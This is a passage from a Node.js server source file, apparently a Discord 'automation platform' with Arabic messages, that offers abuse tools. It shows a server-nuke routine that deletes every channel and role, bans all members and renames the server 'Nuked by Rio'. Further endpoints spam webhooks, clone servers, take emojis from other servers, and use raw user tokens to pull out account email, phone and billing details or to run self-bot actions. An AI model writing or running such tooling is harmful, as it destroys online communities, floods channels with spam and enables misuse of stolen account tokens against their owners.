    if (Array.isArray(channels)) {
      for (const ch of channels) {
        try {
          const r = await fetch(`${API}/channels/${ch.id}`, { method: 'DELETE', headers });
          if (r.status === 429) {
            const d = await r.json().catch(() => ({}));
            await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
            await fetch(`${API}/channels/${ch.id}`, { method: 'DELETE', headers });
          }
          deleted.channels++;
          if (deleted.channels % 5 === 0) send('step', { msg: `مسح ${deleted.channels} قناة...` });
        } catch {}
      }
    }
    send('step', { msg: `تم مسح ${deleted.channels} قناة` });

    // 2. Delete all roles (except @everyone and managed roles)
    send('step', { msg: 'جاري مسح الرتب...' });
    const roles = await fetch(`${API}/guilds/${guild_id}/roles`, { headers }).then(r => r.json());
    if (Array.isArray(roles)) {
      for (const role of roles) {
        if (role.id === guild_id || role.managed) continue; // skip @everyone and bot roles
        try {
          const r = await fetch(`${API}/guilds/${guild_id}/roles/${role.id}`, { method: 'DELETE', headers });
          if (r.status === 429) {
            const d = await r.json().catch(() => ({}));
            await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
            await fetch(`${API}/guilds/${guild_id}/roles/${role.id}`, { method: 'DELETE', headers });
          }
          deleted.roles++;
        } catch {}
      }
    }
    send('step', { msg: `تم مسح ${deleted.roles} رتبة` });

    // 3. Ban all members (this kicks + prevents rejoin)
    send('step', { msg: 'جاري طرد الاعضاء...' });
    let after = '0';
    let banning = true;
    while (banning) {
      const members = await fetch(`${API}/guilds/${guild_id}/members?limit=1000&after=${after}`, { headers }).then(r => r.json());
      if (!Array.isArray(members) || members.length === 0) { banning = false; break; }
      for (const m of members) {
        if (m.user.id === me.id) continue; // don't ban self
        if (m.user.id === guild.owner_id) continue; // can't ban owner
        try {
          const r = await fetch(`${API}/guilds/${guild_id}/bans/${m.user.id}`, {
            method: 'PUT', headers, body: JSON.stringify({ delete_message_seconds: 604800 }),
          });
          if (r.status === 429) {
            const d = await r.json().catch(() => ({}));
            await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
            await fetch(`${API}/guilds/${guild_id}/bans/${m.user.id}`, {
              method: 'PUT', headers, body: JSON.stringify({ delete_message_seconds: 604800 }),
            });
          }
          deleted.bans++;
          if (deleted.bans % 10 === 0) send('step', { msg: `تم طرد ${deleted.bans} عضو...` });
        } catch {}
      }
      after = members[members.length - 1].user.id;
      if (members.length < 1000) banning = false;
    }
    send('step', { msg: `تم طرد ${deleted.bans} عضو` });

    // 4. Change server name + icon
    send('step', { msg: 'جاري تغيير اسم السيرفر...' });
    await fetch(`${API}/guilds/${guild_id}`, {
      method: 'PATCH', headers,
      body: JSON.stringify({ name: 'Nuked by Rio', icon: null }),
    });

    send('done', { msg: `تم النيوك! ${deleted.channels} قناة, ${deleted.roles} رتبة, ${deleted.bans} عضو`, deleted });
  } catch (e) {
    send('error', { msg: 'خطأ: ' + e.message });
  }
  res.end();
});

// ── WEBHOOK SENDER ──────────────────────────────────────────
app.post('/api/webhook-send', async (req, res) => {
  const { webhook_url, content, username, avatar_url, embeds, image_url } = req.body;
  if (!webhook_url) return res.status(400).json({ error: 'رابط الويب هوك مطلوب' });
  try {
    const body = {};
    if (content) body.content = content;
    if (username) body.username = username;
    if (avatar_url) body.avatar_url = avatar_url;
    // auto-detect image URLs in content and add as embed
    const imgRegex = /https?:\/\/\S+\.(png|jpg|jpeg|gif|webp)(\?\S*)?/gi;
    const autoEmbeds = [];
    if (image_url) autoEmbeds.push({ image: { url: image_url } });
    if (content) {
      const matches = content.match(imgRegex);
      if (matches) matches.forEach(url => autoEmbeds.push({ image: { url } }));
    }
    if (embeds?.length) body.embeds = embeds;
    else if (autoEmbeds.length) body.embeds = autoEmbeds;
    const r = await fetch(webhook_url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    if (r.status === 204 || r.ok) res.json({ success: true });
    else res.json({ error: `HTTP ${r.status}`, body: await r.text().catch(() => '') });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── WEBHOOK SPAM ────────────────────────────────────────────
const webhookSpammers = new Map();
app.post('/api/webhook-spam', async (req, res) => {
  const { webhook_url, content, username, count, delay_ms } = req.body;
  if (!webhook_url || !content) return res.status(400).json({ error: 'الرابط والمحتوى مطلوبين' });
  const id = Date.now().toString(36);
  const ctrl = { stop: false, sent: 0, target: count || 100 };
  webhookSpammers.set(id, ctrl);
  (async () => {
    for (let i = 0; i < ctrl.target && !ctrl.stop; i++) {
      try {
        const r = await fetch(webhook_url, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: content.replace(/{n}/g, i + 1), username: username || 'Rio Service' }),
        });
        if (r.status === 429) {
          const d = await r.json().catch(() => ({}));
          await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
          i--; continue;
        }
        ctrl.sent++;
      } catch {}
      if (delay_ms > 0) await new Promise(w => setTimeout(w, delay_ms));
    }
    webhookSpammers.delete(id);
  })();
  res.json({ success: true, id, target: ctrl.target });
});
app.post('/api/webhook-spam-stop', (req, res) => {
  const ctrl = webhookSpammers.get(req.body.id);
  if (ctrl) ctrl.stop = true;
  res.json({ success: true });
});
app.get('/api/webhook-spam-status', (req, res) => {
  const ctrl = webhookSpammers.get(req.query.id);
  res.json(ctrl ? { running: !ctrl.stop, sent: ctrl.sent, target: ctrl.target } : { running: false });
});

// ── TOKEN INFO ──────────────────────────────────────────────
app.get('/api/token-info', async (req, res) => {
  const token = req.query.token;
  if (!token) return res.status(400).json({ error: 'التوكن مطلوب' });
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };
  try {
    const me = await fetch(`${API}/users/@me`, { headers }).then(r => r.json());
    if (me.message || !me.id) return res.json({ valid: false, error: me.message || 'invalid' });
    const guilds = await fetch(`${API}/users/@me/guilds?with_counts=true`, { headers }).then(r => r.json());
    const billing = await fetch(`${API}/users/@me/billing/subscriptions`, { headers }).then(r => r.json()).catch(() => []);
    const nitro = Array.isArray(billing) && billing.some(s => s.type === 1 || s.type === 2);
    const created = new Date(Number(BigInt(me.id) >> 22n) + 1420070400000);
    res.json({
      valid: true,
      id: me.id, username: me.username, global_name: me.global_name,
      email: me.email, phone: me.phone, mfa: me.mfa_enabled,
      avatar: me.avatar ? `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.png` : null,
      banner: me.banner ? `https://cdn.discordapp.com/banners/${me.id}/${me.banner}.png` : null,
      flags: me.public_flags, premium_type: me.premium_type,
      nitro, guilds_count: Array.isArray(guilds) ? guilds.length : 0,
      created: created.toISOString(), locale: me.locale,
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── ACCOUNT EDITOR ──────────────────────────────────────────
app.post('/api/edit-profile', async (req, res) => {
  const { token, bio, global_name, status_text, status_emoji } = req.body;
  if (!token) return res.status(400).json({ error: 'التوكن مطلوب' });
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };
  try {
    const updates = {};
    if (bio !== undefined) updates.bio = bio;
    if (global_name !== undefined) updates.global_name = global_name;
    if (Object.keys(updates).length) {
      await fetch(`${API}/users/@me`, { method: 'PATCH', headers, body: JSON.stringify(updates) });
    }
    // custom status
    if (status_text !== undefined) {
      const custom = status_text ? {
        custom_status: { text: status_text, emoji_name: status_emoji || null, expires_at: null }
      } : { custom_status: null };
      await fetch(`${API}/users/@me/settings`, { method: 'PATCH', headers, body: JSON.stringify(custom) });
    }
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── SERVER CLONER ─────────────────────────────────────────────
app.post('/api/clone-server', async (req, res) => {
  const { token, source_id, target_id } = req.body;
  if (!token || !source_id || !target_id) return res.status(400).json({ error: 'التوكن وايدي السيرفر المصدر والهدف مطلوبين' });

  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive' });
  const send = (evt, data) => { res.write(`event: ${evt}\ndata: ${JSON.stringify(data)}\n\n`); };
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };

  try {
    send('step', { msg: 'جاري جلب بيانات السيرفر المصدر...' });
    const src = await fetch(`${API}/guilds/${source_id}?with_counts=true`, { headers }).then(r => r.json());
    if (!src.id) { send('error', { msg: 'ما قدرت اوصل للسيرفر المصدر' }); res.end(); return; }

    const srcChannels = await fetch(`${API}/guilds/${source_id}/channels`, { headers }).then(r => r.json());
    if (!Array.isArray(srcChannels)) { send('error', { msg: 'ما قدرت اجلب القنوات' }); res.end(); return; }

    // Clone roles (skip @everyone)
    const srcRoles = (src.roles || []).filter(r => r.name !== '@everyone').sort((a, b) => a.position - b.position);
    send('step', { msg: `جاري نسخ ${srcRoles.length} رتبة...` });
    const roleMap = {};
    let rolesCreated = 0;
    for (const role of srcRoles) {
      try {
        const r = await fetch(`${API}/guilds/${target_id}/roles`, {
          method: 'POST', headers,
          body: JSON.stringify({ name: role.name, color: role.color, hoist: role.hoist, mentionable: role.mentionable, permissions: role.permissions }),
        });
        if (r.status === 429) {
          const d = await r.json().catch(() => ({}));
          await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
          continue;
        }
        const nr = await r.json();
        if (nr.id) { roleMap[role.id] = nr.id; rolesCreated++; }
      } catch {}
    }
    send('step', { msg: `تم نسخ ${rolesCreated} رتبة` });

    // Clone categories first, then channels
    const categories = srcChannels.filter(c => c.type === 4).sort((a, b) => a.position - b.position);
    const textVoice = srcChannels.filter(c => c.type !== 4).sort((a, b) => a.position - b.position);
    const catMap = {};
    let chCreated = 0;

    send('step', { msg: `جاري نسخ ${categories.length} تصنيف...` });
    for (const cat of categories) {
      try {
        const r = await fetch(`${API}/guilds/${target_id}/channels`, {
          method: 'POST', headers,
          body: JSON.stringify({ name: cat.name, type: 4, position: cat.position }),
        });
        if (r.status === 429) {
          const d = await r.json().catch(() => ({}));
          await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
          continue;
        }
        const nc = await r.json();
        if (nc.id) { catMap[cat.id] = nc.id; chCreated++; }
      } catch {}
    }

    send('step', { msg: `جاري نسخ ${textVoice.length} قناة...` });
    for (const ch of textVoice) {
      try {
        const body = { name: ch.name, type: ch.type, position: ch.position, nsfw: ch.nsfw || false };
        if (ch.topic) body.topic = ch.topic;
        if (ch.parent_id && catMap[ch.parent_id]) body.parent_id = catMap[ch.parent_id];
        if (ch.bitrate) body.bitrate = ch.bitrate;
        if (ch.user_limit) body.user_limit = ch.user_limit;
        const r = await fetch(`${API}/guilds/${target_id}/channels`, {
          method: 'POST', headers, body: JSON.stringify(body),
        });
        if (r.status === 429) {
          const d = await r.json().catch(() => ({}));
          await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
          continue;
        }
        const nc = await r.json();
        if (nc.id) chCreated++;
        if (chCreated % 5 === 0) send('step', { msg: `نسخ ${chCreated} قناة...` });
      } catch {}
    }

    send('done', { msg: `تم الاستنساخ! ${rolesCreated} رتبة + ${chCreated} قناة`, roles: rolesCreated, channels: chCreated });
  } catch (e) { send('error', { msg: e.message }); }
  res.end();
});

// ── EMOJI STEALER ─────────────────────────────────────────────
app.get('/api/emoji-steal', async (req, res) => {
  const { token, guild_id } = req.query;
  if (!token || !guild_id) return res.status(400).json({ error: 'التوكن وايدي السيرفر مطلوبين' });
  const headers = { Authorization: token, 'User-Agent': UA };
  try {
    const emojis = await fetch(`${API}/guilds/${guild_id}/emojis`, { headers }).then(r => r.json());
    if (!Array.isArray(emojis)) return res.json({ error: emojis.message || 'failed' });
    const list = emojis.map(e => ({
      id: e.id, name: e.name, animated: e.animated,
      url: `https://cdn.discordapp.com/emojis/${e.id}.${e.animated ? 'gif' : 'png'}?size=128`,
    }));
    res.json({ count: list.length, emojis: list });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/emoji-upload', async (req, res) => {
  const { token, target_guild, emojis } = req.body;
  if (!token || !target_guild || !Array.isArray(emojis)) return res.status(400).json({ error: 'مطلوب التوكن والسيرفر والايموجيات' });

  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive' });
  const send = (evt, data) => { res.write(`event: ${evt}\ndata: ${JSON.stringify(data)}\n\n`); };
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };

  let uploaded = 0, failed = 0;
  try {
    for (const em of emojis) {
      try {
        // Download emoji image as base64
        const imgResp = await fetch(em.url);
        const buf = Buffer.from(await imgResp.arrayBuffer());
        const ext = em.animated ? 'gif' : 'png';
        const b64 = `data:image/${ext};base64,${buf.toString('base64')}`;

        const r = await fetch(`${API}/guilds/${target_guild}/emojis`, {
          method: 'POST', headers,
          body: JSON.stringify({ name: em.name, image: b64 }),
        });
        if (r.status === 429) {
          const d = await r.json().catch(() => ({}));
          const wait = d.retry_after || 3;
          send('step', { msg: `Rate limit — ${Math.ceil(wait)}s` });
          await new Promise(w => setTimeout(w, wait * 1000 + 500));
          // retry
          await fetch(`${API}/guilds/${target_guild}/emojis`, {
            method: 'POST', headers,
            body: JSON.stringify({ name: em.name, image: b64 }),
          });
          uploaded++;
        } else if (r.ok) { uploaded++; }
        else { failed++; }
        if ((uploaded + failed) % 3 === 0) send('step', { msg: `رفع ${uploaded} / فشل ${failed}` });
        await new Promise(w => setTimeout(w, 1200));
      } catch { failed++; }
    }
    send('done', { msg: `تم! رفع ${uploaded} ايموجي، فشل ${failed}`, uploaded, failed });
  } catch (e) { send('error', { msg: e.message }); }
  res.end();
});

// ── SERVER INFO ─────────────────────────────────────────────
app.get('/api/server-info', async (req, res) => {
  const { token, guild_id } = req.query;
  if (!token || !guild_id) return res.status(400).json({ error: 'مطلوب' });
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };
  try {
    const g = await fetch(`${API}/guilds/${guild_id}?with_counts=true`, { headers }).then(r => r.json());
    if (!g.id) return res.json({ error: g.message || 'not found' });
    res.json({
      id: g.id, name: g.name, owner_id: g.owner_id,
      member_count: g.approximate_member_count, online_count: g.approximate_presence_count,
      icon: g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` : null,
      boost_level: g.premium_tier, boost_count: g.premium_subscription_count,
      channels: g.channels?.length, roles: g.roles?.length,
      verification_level: g.verification_level,
      created: new Date(Number(BigInt(g.id) >> 22n) + 1420070400000).toISOString(),
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── MESSAGE PURGE (delete your own messages in a channel) ──────
app.post('/api/purge', async (req, res) => {
  const { token, channel_id, count } = req.body;
  if (!token || !channel_id) return res.status(400).json({ error: 'مطلوب التوكن وايدي القناة' });
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };
  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive' });
  const send = (evt, data) => { res.write(`event: ${evt}\ndata: ${JSON.stringify(data)}\n\n`); };

  try {
    const me = await fetch(`${API}/users/@me`, { headers }).then(r => r.json());
    const myId = me.id;
    let deleted = 0, target = count || 100, before = null;
    send('step', { msg: `جاري حذف ${target} رسالة...` });

    while (deleted < target) {
      let url = `${API}/channels/${channel_id}/messages?limit=50`;
      if (before) url += `&before=${before}`;
      const msgs = await fetch(url, { headers }).then(r => r.json());
      if (!Array.isArray(msgs) || msgs.length === 0) break;
      before = msgs[msgs.length - 1].id;
      const mine = msgs.filter(m => m.author.id === myId);
      for (const m of mine) {
        if (deleted >= target) break;
        const dr = await fetch(`${API}/channels/${channel_id}/messages/${m.id}`, { method: 'DELETE', headers });
        if (dr.status === 429) {
          const d = await dr.json().catch(() => ({}));
          await new Promise(w => setTimeout(w, (d.retry_after || 2) * 1000 + 500));
          await fetch(`${API}/channels/${channel_id}/messages/${m.id}`, { method: 'DELETE', headers });
        }
        deleted++;
        if (deleted % 5 === 0) send('step', { msg: `حذفت ${deleted} رسالة...` });
        await new Promise(w => setTimeout(w, 600));
      }
      if (mine.length === 0 && msgs.length < 50) break;
    }
    send('done', { msg: `تم حذف ${deleted} رسالة`, deleted });
  } catch (e) { send('error', { msg: e.message }); }
  res.end();
});

// ── FRIEND LIST ────────────────────────────────────────────────
app.get('/api/friends', async (req, res) => {
  const token = req.query.token;
  if (!token) return res.status(400).json({ error: 'التوكن مطلوب' });
  const headers = { Authorization: token, 'User-Agent': UA };
  try {
    const list = await fetch(`${API}/users/@me/relationships`, { headers }).then(r => r.json());
    if (!Array.isArray(list)) return res.json({ error: list.message || 'failed' });
    const friends = list.filter(r => r.type === 1).map(r => ({
      id: r.id, username: r.user.username, global_name: r.user.global_name,
      avatar: r.user.avatar ? `https://cdn.discordapp.com/avatars/${r.id}/${r.user.avatar}.png` : null,
      status: r.type === 1 ? 'friend' : r.type === 3 ? 'pending' : 'other',
    }));
    const pending = list.filter(r => r.type === 3).map(r => ({
      id: r.id, username: r.user.username, global_name: r.user.global_name,
      avatar: r.user.avatar ? `https://cdn.discordapp.com/avatars/${r.id}/${r.user.avatar}.png` : null,
      status: 'pending',
    }));
    const blocked = list.filter(r => r.type === 2).length;
    res.json({ friends, pending, blocked, total: friends.length });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── INVITE INFO ────────────────────────────────────────────────
app.get('/api/invite-info', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.status(400).json({ error: 'كود الدعوة مطلوب' });
  try {
    const r = await fetch(`${API}/invites/${code}?with_counts=true&with_expiration=true`).then(r => r.json());
    if (!r.guild) return res.json({ error: r.message || 'invalid invite' });
    res.json({
      code: r.code, guild_name: r.guild.name, guild_id: r.guild.id,
      channel: r.channel?.name, member_count: r.approximate_member_count,
      online_count: r.approximate_presence_count,
      icon: r.guild.icon ? `https://cdn.discordapp.com/icons/${r.guild.id}/${r.guild.icon}.png` : null,
      inviter: r.inviter ? `${r.inviter.username}#${r.inviter.discriminator}` : null,
      expires_at: r.expires_at,
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── CREATE INVITE ──────────────────────────────────────────────
app.post('/api/create-invite', async (req, res) => {
  const { token, channel_id, max_age, max_uses } = req.body;
  if (!token || !channel_id) return res.status(400).json({ error: 'مطلوب التوكن وايدي القناة' });
  const headers = { Authorization: token, 'Content-Type': 'application/json', 'User-Agent': UA };
  try {
    const r = await fetch(`${API}/channels/${channel_id}/invites`, {
      method: 'POST', headers,
      body: JSON.stringify({ max_age: max_age || 0, max_uses: max_uses || 0, unique: true }),
    }).then(r => r.json());
    if (r.code) res.json({ success: true, invite: `https://discord.gg/${r.code}`, code: r.code });
    else res.json({ error: r.message || 'failed' });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── USER LOOKUP ────────────────────────────────────────────────
app.get('/api/user-lookup', async (req, res) => {
  const { token, user_id } = req.query;
  if (!token || !user_id) return res.status(400).json({ error: 'مطلوب' });
  const headers = { Authorization: token, 'User-Agent': UA };
  try {
    const u = await fetch(`${API}/users/${user_id}/profile?with_mutual_guilds=true`, { headers }).then(r => r.json());
    if (!u.user) return res.json({ error: u.message || 'not found' });
    const p = u.user;
    res.json({
      id: p.id, username: p.username, global_name: p.global_name,
      avatar: p.avatar ? `https://cdn.discordapp.com/avatars/${p.id}/${p.avatar}.png` : null,
      banner: p.banner ? `https://cdn.discordapp.com/banners/${p.id}/${p.banner}.png` : null,
      bio: u.user_profile?.bio || '', badges: (u.badges || []).map(b => b.id),
      mutual_guilds: (u.mutual_guilds || []).length,
      created: new Date(Number(BigInt(p.id) >> 22n) + 1420070400000).toISOString(),
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── start ──────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`
  ╔═══════════════════════════════════════════════════╗
  ║   ⚡ Rio Service — Discord Automation Platform     ║
  ║   http://localhost:${PORT}                           ║
  ║                                                   ║
  ║   المهام · الشارات · الفويس · البث · الجلسات      ║
  ╚═══════════════════════════════════════════════════╝
  `);
});
